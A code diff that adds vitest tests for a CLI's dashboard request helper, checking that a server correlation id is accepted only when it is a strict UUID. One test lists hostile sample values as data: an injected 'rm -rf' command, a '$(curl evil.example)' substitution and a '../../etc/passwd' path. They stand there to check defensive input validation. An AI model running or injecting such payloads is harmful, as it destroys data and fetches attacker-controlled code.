@@ -1,6 +1,9 @@
 import { afterEach, describe, expect, it, vi } from "vitest";
 
-import { dashboardRequest } from "../../src/cli/dashboard-request.js";
+import {
+  dashboardRequest,
+  DashboardRequestError,
+} from "../../src/cli/dashboard-request.js";
 
 function jsonResponse(
   status: number,
@@ -87,6 +90,71 @@ describe("dashboardRequest", () => {
     await expect(dashboardRequest("/api/missing")).rejects.toThrow(
       "endpoint not implemented in this build (HTTP 404): missing route. Hint: verify the dashboard exposes /api/missing, or upgrade/restart Sanctuary dashboard.",
     );
+  });
+
+  // The FIRST link in the federation adopt diagnosability chain: an endpoint
+  // that refuses to say WHICH check failed hands back a correlation id instead,
+  // and this is where that id enters the process.
+  it("extracts a server correlation id from a denial body", async () => {
+    vi.stubGlobal(
+      "fetch",
+      vi.fn<typeof fetch>().mockResolvedValue(
+        jsonResponse(403, {
+          error: "forbidden",
+          request_id: "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
+        }) as Response,
+      ),
+    );
+
+    const err = await dashboardRequest("/v1/federation/rotate/reissue-node-cert").then(
+      () => null,
+      (cause: unknown) => cause,
+    );
+    expect(err).toBeInstanceOf(DashboardRequestError);
+    expect((err as DashboardRequestError).requestId).toBe(
+      "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
+    );
+  });
+
+  it("refuses a correlation id that is not literally a UUID", async () => {
+    // This value arrives from a host the client has NOT authenticated (the
+    // reissue route is pre-session) and is later displayed inside a command the
+    // operator is invited to run. Anything but a UUID is DROPPED at the door
+    // rather than escaped at each display site.
+    for (const hostile of [
+      "3f2504e0-4f89-41d3-9a0c-0305e82c3301\nrm -rf ~/.sanctuary",
+      "$(curl evil.example)",
+      "../../etc/passwd",
+      "x".repeat(10_000),
+      12345,
+      { toString: () => "3f2504e0-4f89-41d3-9a0c-0305e82c3301" },
+    ]) {
+      vi.stubGlobal(
+        "fetch",
+        vi.fn<typeof fetch>().mockResolvedValue(
+          jsonResponse(403, { error: "forbidden", request_id: hostile }) as Response,
+        ),
+      );
+      const err = (await dashboardRequest("/v1/federation/rotate/reissue-node-cert").then(
+        () => null,
+        (cause: unknown) => cause,
+      )) as DashboardRequestError;
+      expect(err.requestId).toBeUndefined();
+    }
+  });
+
+  it("leaves requestId undefined for endpoints that mint none", async () => {
+    vi.stubGlobal(
+      "fetch",
+      vi
+        .fn<typeof fetch>()
+        .mockResolvedValue(jsonResponse(403, { error: "forbidden" }) as Response),
+    );
+    const err = (await dashboardRequest("/api/task").then(
+      () => null,
+      (cause: unknown) => cause,
+    )) as DashboardRequestError;
+    expect(err.requestId).toBeUndefined();
   });
 
   it("wraps network failures with setup guidance and nested cause detail", async () => {
